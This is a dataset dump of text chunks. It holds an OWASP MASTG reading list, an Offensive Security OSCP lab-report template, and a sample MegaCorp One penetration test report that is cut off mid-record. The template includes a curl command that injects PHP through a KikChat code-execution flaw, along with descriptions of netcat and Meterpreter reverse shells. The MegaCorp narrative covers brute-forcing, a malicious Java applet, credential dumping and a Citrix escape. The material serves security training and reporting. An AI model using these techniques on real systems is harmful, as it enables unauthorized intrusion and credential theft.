Bernhard Mueller. Special thanks to Michael Helwig for finding and fixing an oversight in the anti-tampering mechanism. DVIA Platform: ios Availableat: http://damnvulnerableiosapp.com/ A vulnerable iOS app written in Objective-C which provides a platform to mobile security enthusiasts/professionals or studentstotesttheiriOSpenetrationtestingskills. DVIA-v2 Platform: ios Availableat: https://github.com/prateek147/DVIA-v2 AvulnerableiOSapp,writteninSwiftwithover15vulnerabilities. 574\\nSuggested Reading Mobile App Security Android • DominicChell,TyroneErasmus,ShaunColley,OllieWhitehous(2015)MobileApplicationHacker’sHandbook. Wiley. Availableat: https://www.wiley.com/en-us/The+Mobile+Application+Hacker%27s+Handbook-p-9781118958506 • JoshuaJ.Drake,ZachLanier,CollinMulliner,PauOliva,StephenA.Ridley,GeorgWicherski(2014)AndroidHacker’s Handbook. Wiley. Availableat: https://www.wiley.com/en-us/Android+Hacker%27s+Handbook-p-9781118608647 • GodfreyNolan(2014)BulletproofAndroid. Addison-WesleyProfessional. Availableat: https://www.amazon.com/B ulletproof-Android-Practical-Building-Developers/dp/0133993329 • NikolayElenkov(2014)AndroidSecurityInternals: AnIn-DepthGuidetoAndroid’sSecurityArchitecture. NoStarch Press. Availableat: https://nostarch.com/androidsecurity • JonathanLevin(2015)AndroidInternals:: Aconfectionerscookbook-VolumeI:Thepoweruser’sview. Technolo- geeks.com. Availableat: http://newandroidbook.com/ iOS • Charlie Miller, Dionysus Blazakis, Dino Dai Zovi, Stefan Esser, Vincenzo Iozzo, Ralf-Philipp Weinmann (2012) iOS Hacker’sHandbook. Wiley. Availableat: https://www.wiley.com/en-us/iOS+Hacker%27s+Handbook-p-97811182 04122 • David Thiel (2016) iOS Application Security, The Definitive Guide for Hackers and Developers. no starch press. Availableat: https://www.nostarch.com/iossecurity • JonathanLevin(2017),MacOSXandiOSInternals,Wiley. Availableat: http://newosxbook.com/index.php Reverse Engineering • BruceDang, AlexandreGazet, EliasBackaalany(2014)PracticalReverseEngineering. Wiley. Availableat: https: //www.wiley.com/en-us/Practical+Reverse+Engineering%3A+x86%2C+x64%2C+ARM%2C+Windows+Kernel%2C +Reversing+Tools%2C+and+Obfuscation-p-9781118787311 • Skakenunny,HangcomiOSAppReverseEngineering. Online. Availableat: https://github.com/iosre/iOSAppRever seEngineering/ • BernhardMueller(2016)HackingSoftTokens-AdvancedReverseEngineeringonAndroid. HITBGSECSingapore. Availableat: http://gsec.hitb.org/materials/sg2016/D1%20-%20Bernhard%20Mueller%20-%20Attacking%20Softw are%20Tokens.pdf • DennisYurichev(2016)ReverseEngineeringforBeginners. Online. Availableat: https://beginners.re/ • MichaelHaleLigh,AndrewCase,JamieLevy,AaronWalters(2014)TheArtofMemoryForensics. Wiley. Available at: https://www.wiley.com/en-us/The+Art+of+Memory+Forensics%3A+Detecting+Malware+and+Threats+in+W indows%2C+Linux%2C+and+Mac+Memory-p-9781118825099 • JacobBaines(2016)ProgrammingLinuxAnti-ReversingTechniques. Leanpub. Availableat: https://leanpub.com/ anti-reverse-engineering-linux 575",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 178
    }
  },
  {
    "text": "Penetration Test Report for Internal Lab and Exam v. 1.1 student@youremailaddress.com OSID: XXXXX © All rights reserved to Offensive Security, 2016 No part of this publication, in whole or in part, may be reproduced, copied, transferred or any other right reserved to its copyright owner, including photocopying and all other copying, any transfer or transmission using any network or other means of communication, any broadcast for distant learning, in any form or by any means such as any information storage, transmission or retrieval system, without prior written permission from Offensive Security.\\nAbout this Document Submitting your course exercises, PWK lab report, along with your exam report, may have its benefits. For example, up to 5 points may be earned by submitting your lab report along with your exercises. Although submitting your PWK lab report and the corresponding course exercises is completely optional, it is not difficult to see why it’s highly recommended to do so . This document is provided as an example of what is expected, at minimum, in a typical lab report that is submitted for review. You must successfully compromise no less than 10 machines in the labs and document all of your steps as illustrated in the “Offensive Security Lab and Exam Penetration Report: Section 3 - Methodologies” template. You may choose to include more than 10 machines in your report, however this will not provide any additional points to your final exam score. The sample report presented in this document has been adapted for the non-native English speaker. For that reason, Offensive Security has opted for a more visual (i.e: more screenshots) style of reporting. A narrative of how the machine was compromised as well as vulnerability information can be included in the report, at your discretion. Please note that this template is only a guide, you may opt not to use it and create your own. The report, regardless of the template used, must be clear, concise, and most importantly, it must be reproducible. In other words, we must be able to compromise the machine again by simply following the report. 2 | P a g e\\nTable of Contents 1.0 Offensive Security Lab and Exam Penetration Test Report .............................................................. 4 1.1 Introduction ....................................................................................................................................... 4 1.2 Objective ............................................................................................................................................ 4 1.3 Requirements ..................................................................................................................................... 4 2.0 Report – High-Level Summary ......................................................................................................... 5 2.1 Report - Recommendations ............................................................................................................... 5 3.0 Report – Methodologies ................................................................................................................. 5 3.1 Report – Information Gathering ......................................................................................................... 6 3.2 Report – Service Enumeration ........................................................................................................... 6 3.3 Report – Penetration .......................................................................................................................... 7 3.4 Report – House Cleaning .................................................................................................................. 14 4.0 PWK Course Exercises ................................................................................................................... 14 3 | P a g e\\n1.0 Offensive Security Lab and Exam Penetration Test Report 1.1 Introduction The Offensive Security Lab and Exam penetration test report should contain all the steps taken to successfully compromise machines both in the exam and lab environments. Accompanying data used in both environments should also be included, such as PoCs, custom exploit code, and so on. Please note that this report will be graded from a",
    "metadata": {
      "doc_id": "Offensive Security - Penetration Test Report",
      "chunk_id": 0
    }
  },
  {
    "text": "Exam penetration test report should contain all the steps taken to successfully compromise machines both in the exam and lab environments. Accompanying data used in both environments should also be included, such as PoCs, custom exploit code, and so on. Please note that this report will be graded from a standpoint of correctness and completeness. The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge required to successfully achieve the Offensive Security Certified Professional (OSCP) certification. 1.2 Objective The objective of this assessment is to perform an internal penetration test against the Offensive Security Lab and Exam network. The student is tasked with following methodical approach in obtaining access to the objective goals. This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report. A sample page has been included in this document that should help you determine what is expected of you from a reporting standpoint. Please use the sample report as a guide to get you through the reporting requirement of the course. 1.3 Requirements The student will be required to complete this penetration testing report in its entirety and to include the following sections: • Overall High-Level Summary and Recommendations (Non-technical) • Methodology walk-through and detailed outline of steps taken • Each finding with accompanying screenshots, walk-throughs, sample code, and proof.txt file if applicable. • Any additional items as deemed necessary 4 | P a g e\\n2.0 Report – High-Level Summary OS-XXXXX was tasked with performing an internal penetration test in the Offensive Security Labs and Exam network. An internal penetration test is a simulated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a malicious entity, and attempt to infiltrate Offensive Security’s internal lab systems – the THINC.local domain, and the exam network. OS- XXXXX’s overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security. While conducting the internal penetration test, there were several alarming vulnerabilities that were identified within Offensive Security’s network. For example, OS-XXXXX was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations. During testing, OS-XXXXX had administrative level access to multiple systems. All systems were successfully exploited and access granted. These systems as well as a brief description on how access was obtained are listed below: • Target #1 – Obtained a low-privilege shell via the vulnerable web application called 'KikChat'. Once in, access was leveraged to escalate to 'root' using the 'getsystem' command in Meterpreter. 2.1 Report - Recommendations OS-XXXXX recommends patching the vulnerabilities identified during the penetration test to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program in order to mitigate additional vulnerabilities that may",
    "metadata": {
      "doc_id": "Offensive Security - Penetration Test Report",
      "chunk_id": 1
    }
  },
  {
    "text": "recommends patching the vulnerabilities identified during the penetration test to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program in order to mitigate additional vulnerabilities that may be discovered at a later date. 3.0 Report – Methodologies OS-XXXXX utilized a widely adopted approach to performing penetration testing that is effective in testing how well the Offensive Security Labs and Exam environments are secure. Below is a summary of how OS-XXXXX was able to identify and exploit a number of systems. 5 | P a g e\\n3.1 Report – Information Gathering The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, OS-XXXXX was tasked with exploiting the lab and exam network. The specific IP addresses were: Lab Network 192.168.31.218 3.2 Report – Service Enumeration The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable to an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system provides an attacker with vital information before conducting the actual penetration test. In some cases, some ports may not be listed. Server IP Address Ports Open Service/Banner 192.168.31.218 TCP: 80, 3389 Apache / RDP 6 | P a g e\\n3.3 Report – Penetration The penetration testing portion of the assessment focuses heavily on gaining access to a variety of systems. During this penetration test, OS-XXXXX was able to successfully gain access to 10 out of the 50 systems. Vulnerability Exploited: KikChat - (LFI/RCE) Multiple Vulnerability System Vulnerable: 192.168.31.218 Vulnerability Explanation: The KikChat web application suffers from a Local File Include (LFI), as well as a Remote Code Execution (RCE) vulnerability. A combination of these vulnerabilities was used to obtain a low privilege shell. Privilege Escalation Vulnerability: Named Pipe Impersonation (In Memory/Admin) Vulnerability Fix: No known patch or update for this issue. Severity: Critical Information Gathering: 7 | P a g e\\nFull Nmap scan of all ports: Nikto scan on target’s port 80: 8 | P a g e\\nContent of target’s robots.txt (using curl): Further enumeration of port 80 using a browser: Searching Exploit-DB for PoC on KikChat’s vulnerability: 9 | P a g e\\nProof Of Concept Code: https://www.exploit-db.com/exploits/30235/ Confirming RCE: Using the PoC from Exploit-DB, additional information about the web server is gathered by creating a php file with 'phpinfo()', and viewing it. Command issued from terminal: curl -s http://192.168.31.218/8678576453/rooms/get.php\\?name\\=info.php\\&ROOM\\=\"<?php+ phpinfo()+?>\" Viewing custom php file in the browser: 10 | P a g e\\nGetting Low-Privilege shell: Using the RCE vulnerability, create a php file called 'shell.php' that will download 'nc.txt'. Save it as a batch file, create 'nc.exe' and connect back to attacker: Hosting 'nc.txt' file: RCE command to download 'nc.txt', run 'shell.php', and connect to attacking machine: Listener on attacking machine: 11 | P",
    "metadata": {
      "doc_id": "Offensive Security - Penetration Test Report",
      "chunk_id": 2
    }
  },
  {
    "text": "shell: Using the RCE vulnerability, create a php file called 'shell.php' that will download 'nc.txt'. Save it as a batch file, create 'nc.exe' and connect back to attacker: Hosting 'nc.txt' file: RCE command to download 'nc.txt', run 'shell.php', and connect to attacking machine: Listener on attacking machine: 11 | P a g e\\nPrivilege Escalation: Using Metasploit, a meterpreter php reverse shell is created. Once created, it is then uploaded to the target machine the same way as the 'nc.txt' file, and then it is executed using 'curl'. Creating Meterpreter PHP reverse shell: Hosting & executing malicious file: 12 | P a g e\\nCreating a Meterpreter reverse TCP shell, executing it, and escalating with 'getsystem': 13 | P a g e\\nProof file: 3.4 Report – House Cleaning The house-cleaning portion of the assessment ensures that remnants of the penetration test are removed. Often times, fragments of tools or user accounts are left on an organization’s computer, which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is paramount importance. After the objectives on both the lab network and exam network were successfully completed, OS-XXXXX removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from any of the systems. 4.0 PWK Courses Exercises Course exercises are to be documented, and added in this section of the report. 14 | P a g e",
    "metadata": {
      "doc_id": "Offensive Security - Penetration Test Report",
      "chunk_id": 3
    }
  },
  {
    "text": "Penetration Test Report MegaCorp One August 10th, 2013 Offensive Security Services, LLC 19706 One Norman Blvd. Suite B #253 Cornelius, NC 28031 United States of America Tel: 1-402-608-1337 Fax: 1-704-625-3787 Email: info@offsec.com\\nTable of Contents Executive Summary 1 Summary of Results 2 Attack Narrative 3 Remote System Discovery 3 Admin Webserver Interface Compromise 6 Interactive Shell to Admin Server 9 Administrative Privilege Escalation 12 Java Client Attacks 13 Escalation to Local Administrator 15 Deep Packet Inspection Bypass 16 Citrix Environment Compromise 20 Escalation to Domain Administrator 24 Conclusion 28 Recommendations 29 Risk Rating 30 Appendix A: Vulnerability Detail and Mitigation 31 Risk Rating Scale 31 Default or Weak Credentials 31 Password Reuse 32 Shared Local Administrator Password 32 Patch Management 33 DNS Zone Transfer 33 Default Apache Files 33 Appendix B: About Offensive Security 34 PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page i\\nExecutive Summary Offensive Security was contracted by MegaCorp One to conduct a penetration test in order to determine its exposure to a targeted attack. All activities were conducted in a manner that simulated a malicious actor engaged in a targeted attack against MegaCorp One with the goals of: o Identifying if a remote attacker could penetrate MegaCorp One’s defenses o Determining the impact of a security breach on: o Confidentiality of the company’s private data o Internal infrastructure and availability of MegaCorp One’s information systems Efforts were placed on the identification and exploitation of security weaknesses that could allow a remote attacker to gain unauthorized access to organizational data. The attacks were conducted with the level of access that a general Internet user would have. The assessment was conducted in accordance with the recommendations outlined in NIST SP 800-1151 with all tests and actions being conducted under controlled conditions. 1 http://csrc.nist.gov/publications/nistpubs/800-115/SP800-115.pdf PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 1 of 34\\nSummary of Results Initial reconnaissance of the MegaCorp One network resulted in the discovery of a misconfigured DNS server that allowed a DNS zone transfer. The results provided us with a listing of specific hosts to target for this assessment. An examination of these hosts revealed a password-protected administrative webserver interface. After creating a custom wordlist using terms identified on the MegaCorp One’s website we were able to gain access to this interface by uncovering the password via brute-force. An examination of the administrative interface revealed that it was vulnerable to a remote code injection vulnerability, which was used to obtain interactive access to the underlying operating system. This initial compromise was escalated to administrative access due to a lack of appropriate system updates on the webserver. After a closer examination, we discovered that the compromised webserver utilizes a Java applet for administrative users. We added a malicious payload to this applet, which gave us interactive access to workstations used by MegaCorp One’s administrators. Using the compromised webserver as a pivot point along with passwords recovered from it, we were able to target previously inaccessible internal resources. This resulted",
    "metadata": {
      "doc_id": "Offensive Security - sample-penetration-testing-report",
      "chunk_id": 0
    }
  },
  {
    "text": "Java applet for administrative users. We added a malicious payload to this applet, which gave us interactive access to workstations used by MegaCorp One’s administrators. Using the compromised webserver as a pivot point along with passwords recovered from it, we were able to target previously inaccessible internal resources. This resulted in Local Administrator access to numerous internal Windows hosts, complete compromise of a Citrix server, and full administrative control of the Windows Active Directory infrastructure. Existing network traffic controls were bypassed through encapsulation of malicious traffic into allowed protocols. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 2 of 34\\nAttack Narrative Remote System Discovery For the purposes of this assessment, MegaCorp One provided minimal information outside of the organizational domain name: megacorpone.com. The intent was to closely simulate an adversary without any internal information. To avoid targeting systems that were not owned by MegaCorp One, all identified assets were submitted for ownership verification before any attacks were conducted. In an attempt to identify the potential attack surface, we examined the name servers of the megacorpone.com domain name (Figure 1). Figure 1 – Information gathering for megacorpone.com reveals three active name servers. With the name servers identified, we attempted to conduct a zone transfer. We found that ns2.megacorpone.com was vulnerable to a full DNS zone transfer misconfiguration. This provided us with a listing of hostnames and associated IP addresses, which could be used to further target the organization. (Figure 2) Zone transfers can provide attackers with detailed information about the capabilities of the organization. It can also leak information about the network ranges owned by the organization. Please see Appendix A for more information. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 3 of 34\\nFigure 2 – A misconfigured name server allows a full and unrestricted DNS zone transfer. The list of identified hosts was submitted to MegaCorp One for verification, which verified that the entire 50.7.67.x network range should be included in the assessment scope. These systems were then scanned to enumerate any running services. All identified services were examined in detail to determine their potential exposure to a targeted attack. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 4 of 34\\nThrough a combination of DNS enumeration techniques and network scanning, we were able to build a composite that we feel reflects MegaCorp One’s network. The target network is shown below in Figure 3. Additional details regarding controls such as deep packet inspection were discovered later in the assessment but are included here for completeness. Figure 3 - Target Network PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 5 of 34\\nAdmin Webserver Interface Compromise The admin.megacorpone.com webserver was found to be running an Apache webserver on port 81. Accessing the root URL of this site resulted in the display of a blank page. We next conducted a quick enumeration scan of the system looking for common directories and files (Figure 4). Figure 4 –",
    "metadata": {
      "doc_id": "Offensive Security - sample-penetration-testing-report",
      "chunk_id": 1
    }
  },
  {
    "text": "The admin.megacorpone.com webserver was found to be running an Apache webserver on port 81. Accessing the root URL of this site resulted in the display of a blank page. We next conducted a quick enumeration scan of the system looking for common directories and files (Figure 4). Figure 4 – Enumeration of the admin.megacorpone.com host partially discloses the webserver’s folder structure. The scan results revealed that along with common Apache default files (Please see Appendix A for more information), we identified an “/admin” directory that was only accessible after authentication. (Figure 5). Figure 5 – Access to the “admin” folder is password-protected. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 6 of 34\\nTo prepare a targeted brute-force attempt against this system, we compiled a custom dictionary file based on the content of the www.megacorpone.com website. The initial dictionary consisted of 331 custom words, which were then put through several rounds of permutations and substitutions to produce a final dictionary file of 16,201 words. This dictionary file was used along with the username “admin” against the protected section of the site. Figure 6 – Using a custom word dictionary it is possible to discover the administrative password for the “admin” folder. This brute-force attack uncovered a password of “nanotechnology1” for the admin user. We were able to leverage these credentials to successfully gain unauthorized access to the protected portion of the website (Figure 6). Please see Appendix A for more information on the exploited vulnerability. The administrative portion of the website contained the SQLite Manager web interface (Figure 7), which was accessible without any additional credentials. Utilizing this interface, we found what appeared to be the database that supported an instance of phpSQLiteCMS2. Figure 7 – An instance of SQLite Manager is found to be running on the compromised webserver. 2 http://phpsqlitecms.net/ PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 7 of 34\\nThe interface gave us direct access to the data and the ability to extract a list of users on the system with the associated password hash values (Figure 8). Figure 8 – Lack of additional access controls allows an attacker to retrieve usernames and password hashes from the “userdata” database. After examination of the values, we found that the hashes did not conform to any standard format. Using a copy of the “phpselitecms” software, we examined the source code to determine exactly how this value is produced. Through this process we were able to identify the function responsible for hashing of the account passwords. Figure 9 – Source code review leads to the discovery of the password hash generation algorithm. With the newly-acquired knowledge of the password hashing format and the use of a randomly generated 10 character salt value, we were able to easily convert the recovered hashes into their salted SHA1 equivalent and conduct a brute-force attack. This effort resulted in the recovery of two plaintext passwords. Although these values were not immediately useful, they were retained in hope",
    "metadata": {
      "doc_id": "Offensive Security - sample-penetration-testing-report",
      "chunk_id": 2
    }
  },
  {
    "text": "use of a randomly generated 10 character salt value, we were able to easily convert the recovered hashes into their salted SHA1 equivalent and conduct a brute-force attack. This effort resulted in the recovery of two plaintext passwords. Although these values were not immediately useful, they were retained in hope that they may have been re-used on other systems within the organization. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 8 of 34\\nInteractive Shell to Admin Server The previously discovered SQLite Manager software was found to be vulnerable to a well-known code injection vulnerability3. Successful exploitation of this vulnerability results in shell access to the underlying system in the context of the webserver user. Using a modified public exploit, we were able to obtain limited interactive access to the admin.megacorpone.com webserver. Please see Appendix A for more information. Figure 10 – A publicly available SQLite exploit is used to gain unauthorized access on the admin.megacorpone.com host. 3 http://www.exploit-db.com/exploits/24320/ PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 9 of 34\\nFigure 11 – Control of the vulnerable server is limited to the context of the www-data user. The public version of the exploit targets a slightly different version of the SQLite Manager than the one deployed by MegaCorp One. Although the deployed version of the software is vulnerable to the same underlying issues, the exploit does not successfully run without modification. We were able to extend the original exploit to support HTTP authentication and customize it for the updated version. A copy of this updated exploit will be provided separately from this report. The extent of compromise at this point can be best visualized in Figure 12. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 10 of 34\\nFigure 12 - Web Server Compromise PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 11 of 34\\nAdministrative Privilege Escalation With interactive access to the underlying operating system of the administrative webserver obtained, we continued with the examination of the system searching for ways to escalate privileges to the administrative level. We found that the system was vulnerable to a local privilege escalation exploit4, which we were able to utilize successfully. Please see Appendix A for more information. Figure 13 – A local privilege escalation exploit is used to take advantage of an unpatched host and gain root-level access. The use of this exploit was partially made possible due to the inclusion of developer tools on the vulnerable system. If these tools were not present on the system, it would have still been possible to successfully exploit, although the difficulty in doing so would have been increased. In its current configuration, the webserver represents an internal attack platform for a malicious party. With the ability to gain full administrative access, a malicious party could utilize this vulnerable system for a multitude of purposes, ranging from attacks against MegaCorp One itself, to attacks against its customers. It’s highly likely that the",
    "metadata": {
      "doc_id": "Offensive Security - sample-penetration-testing-report",
      "chunk_id": 3
    }
  },
  {
    "text": "configuration, the webserver represents an internal attack platform for a malicious party. With the ability to gain full administrative access, a malicious party could utilize this vulnerable system for a multitude of purposes, ranging from attacks against MegaCorp One itself, to attacks against its customers. It’s highly likely that the attackers would leverage this system for both purposes. 4 http://www.exploit-db.com/exploits/18411/ PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 12 of 34\\nJava Client Attacks Using the administrative access to the system, we conducted an analysis of the exploited system. This resulted in the discovery of a private section of the website that serves a Java applet only to specific workstations. This network range in question was later discovered to be the management network for MegaCorp One. Figure 14 - Htaccess rules reveal an additional subnet on the compromised network. Through examination of the log files and the Java applet present on the system, we found that the applet provided administrative functionality to a subset of internal users of MegaCorp One. This was advantageous to us as attackers, as it provided us with a potential path to internal systems that otherwise were not easily accessible. Upon obtaining permission from MegaCorp One, we added an additional applet to be downloaded by clients. The theory of this attack was that clients would access the trusted applet, allow it to run, and provide us with direct access to additional client hosts. This is a derivative of a common social engineering attack in which the victim is manipulated into running a malicious applet. In this case however, no effort was required to mislead the victim as the applet is already regarded as trusted. This attack worked as intended, providing us with access to an additional client system. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 13 of 34\\nFigure 15 – Using a malicious java applet it is possible to exploit a host on the management subnet. With this compromise in place, we obtained access to systems in the management network as indicated in Figure 16. Figure 16 – Successful java applet attack compromises the MegaCorp One management subnet. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 14 of 34\\nEscalation to Local Administrator The access provided by the Java applet attack was limited to the level of a standard user. To maximize the impact of the compromise we wanted to escalate access to the level of Domain Administrator. As the first step, we needed to obtain local administrative access. In an effort to accomplish this, we examined the compromised system to identify how it could be leveraged. Using this approach we found a Group Policy Preferences file on the system that allowed us to decrypt the local administrative password56. Please see Appendix A for more information. Figure 17 – Using the newly gained access it is possible to retrieve the Groups.xml file from a domain controller. 5http://msdn.microsoft.com/en-us/library/cc422924.aspx 6http://blogs.technet.com/b/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences- updated.aspx PTR-20130513 Copyright © 2013 Offensive Security",
    "metadata": {
      "doc_id": "Offensive Security - sample-penetration-testing-report",
      "chunk_id": 4
    }
  },
  {
    "text": "Preferences file on the system that allowed us to decrypt the local administrative password56. Please see Appendix A for more information. Figure 17 – Using the newly gained access it is possible to retrieve the Groups.xml file from a domain controller. 5http://msdn.microsoft.com/en-us/library/cc422924.aspx 6http://blogs.technet.com/b/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences- updated.aspx PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 15 of 34\\nFigure 18 – Encrypted local administrator password is found in the Groups.xml file. Figure 19 – Using the encryption key published by Microsoft, the encrypted password is easily decrypted. Using the recovered plaintext password, we were able to gain local administrative access to the compromised client. Deep Packet Inspection Bypass While trying to establish additional layers of access into the compromised system, we encountered aggressive egress filtering. This was first encountered while trying to establish an encrypted outbound tunnel for the Microsoft Remote Desktop Protocol. Figure 20 – Initial attempts to establish an outbound tunnel for RDP were blocked by the egress filtering systems. Additionally, we discovered network protocol enforcement as we attempted to connect to the attacker SSH server on port 80. To bypass this, we created a tunnel within the existing meterpreter session to allow us to access Windows file sharing from the attacker system. This was utilized to run a windows command shell on the compromised host as the local administrative user. Within this shell, we executed an additional meterpreter payload. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 16 of 34\\nFigure 21 – Port forwarding through the initial meterpreter session is established in order to achieve direct access to the compromised management host. Figure 22 – Newly established connection is used to gain an administrative shell on the compromised management host. Figure 23 - Local Administrator access is used to establish a meterpreter shell on host 10.7.0.22. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 17 of 34\\nWith the new meterpreter shell in place, we then utilized HTTP-Tunnel, an open source utility7, that encapsulates arbitrary traffic within the HTTP payload. We used the newly established “http tunnel” to encapsulate a remote desktop connection between the attacker and compromised client. This allowed us to obtain full graphical access to the compromised client system. The remote desktop session was established using the password for user “mike”, which was discovered to be re-used from the compromised SQLite Manager application. Please see Appendix A for more information. Figure 24 - Remote Desktop access is established by encapsulating the previously filtered protocol through a http tunnel. At this point, the external perimeter of the MegaCorp One network was fully compromised as shown in Figure 25. The virtual equivalent of console access to a computer within the MegaCorp One’s trusted environment had been obtained. It should be noted that the current access to the Windows network was limited to a non-privileged domain user account and a local administrator account. 7 http://http-tunnel.sourceforge.net/ PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 18 of 34\\nFigure",
    "metadata": {
      "doc_id": "Offensive Security - sample-penetration-testing-report",
      "chunk_id": 5
    }
  },
  {
    "text": "the MegaCorp One’s trusted environment had been obtained. It should be noted that the current access to the Windows network was limited to a non-privileged domain user account and a local administrator account. 7 http://http-tunnel.sourceforge.net/ PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 18 of 34\\nFigure 25 – Compromise of the MegaCorp One network has reached into the network management subnet. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 19 of 34\\nCitrix Environment Compromise Using remote desktop access to the internal network, we proceeded to explore the network in search of high value targets. One such target appeared to be a Citrix server, which was set as the homepage on the compromised host. Using the same credentials that were utilized to establish the remote desktop connection, we were able to successfully login to this Citrix environment. Figure 26 – A Citrix server offering only Internet Explorer was discovered on the MegaCorp One network. This Citrix environment exposed “Internet Explorer” as the only available application. This is a commonly utilized method by many organizations to limit access to the underlying operating system of the Citrix server. It is important to note that many methods exist to bypass this configuration. In this case, we utilized the “Save” dialog window to create a batch file that would provide us with a Powershell interface. This is possible as the “Save” dialog operates in much the same manner as a standard “Windows Explorer” file management window. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 20 of 34\\nFigure 27 – Using the Save dialog, it is possible to bypass the some restrictions imposed by the Citrix environment. Figure 28 – A batch file invoking the Powershell application is created on the Citrix server. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 21 of 34\\nFigure 29 – Citrix restriction is bypassed resulting in the execution of the Powershell. The ability to use Powershell was then utilized to download a malicious payload, which would provide us with a meterpreter session to the underlying Citrix server. Figure 30 - Powershell functionality allows an end-user to retrieve files from arbitrary sources, including remote internet locations. The ability to utilize the “Save” dialog to run arbitrary executable programs was combined with the previously discovered local administrator password allowing us to execute programs in the context of the local administrator. This allowed us to gain full administrative control of the Citrix system. Please see Appendix A for more information. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 22 of 34\\nFigure 31 – Password re-use allows the attackers to execute a malicious executable with administrative privileges. Figure 32 – Complete compromise of the Citrix server is achieved. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 23 of 34\\nFigure 33 – An additional host in the network management subnet has been compromised. Escalation to Domain Administrator With the Citrix server",
    "metadata": {
      "doc_id": "Offensive Security - sample-penetration-testing-report",
      "chunk_id": 6
    }
  },
  {
    "text": "with administrative privileges. Figure 32 – Complete compromise of the Citrix server is achieved. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 23 of 34\\nFigure 33 – An additional host in the network management subnet has been compromised. Escalation to Domain Administrator With the Citrix server compromised, we made an attempt to capture passwords from memory. A Citrix server is an ideal candidate for this attack vector, as it typically operates for long periods of time without reboots and services a large number of users. To capture passwords from memory, we utilized the Windows Credential Editor tool8 due to its ability to run on 64 bit systems without causing adverse effects. 8 http://www.ampliasecurity.com/research/wcefaq.html PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 24 of 34\\nFigure 34 – Windows Credentials Editor is used to retrieve plaintext passwords from the Citrix server. This revealed multiple passwords, including a Windows domain administrator account. Please see Appendix A for more information. In order to validate the newly recovered credentials, we successfully created a new remote desktop session to the Citrix server using the domain administrator credentials. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 25 of 34\\nFigure 35 - Domain Administrator credentials are validated against the Citrix host. At this point, full control of the Windows domain had been obtained. A malicious attacker would have multiple tools at their disposal, including: o Utilization of Group Policy to deploy backdoor software on Windows systems. o Complete exfiltration of all data stored on any system that uses Windows authentication. o Destruction of any and all network resources. o Targeted attacks against any and all employees of MegaCorp One, through the use of information gathering tools such as keystroke loggers to identify personal information. o Leveraging this systemic access to conduct attacks against MegaCorp One suppliers and partners that maintain a trust relationship with the company. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 26 of 34\\nIt was determined that while these steps would be possible, they would be considered outside the scope of the current engagement. It was demonstrated that a total compromise of the MegaCorp One domain had been accomplished with a complete loss of integrity for all local systems. Figure 36 - Full Domain Compromise PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 27 of 34\\nConclusion MegaCorp One suffered a series of control failures, which led to a complete compromise of critical company assets. These failures would have had a dramatic effect on MegaCorp One operations if a malicious party had exploited them. Current policies concerning password reuse and deployed access controls are not adequate to mitigate the impact of the discovered vulnerabilities. The specific goals of the penetration test were stated as: o Identifying if a remote attacker could penetrate MegaCorp One’s defenses o Determining the impact of a security breach on: o Confidentiality of the company’s information o Internal infrastructure and availability of",
    "metadata": {
      "doc_id": "Offensive Security - sample-penetration-testing-report",
      "chunk_id": 7
    }
  },
  {
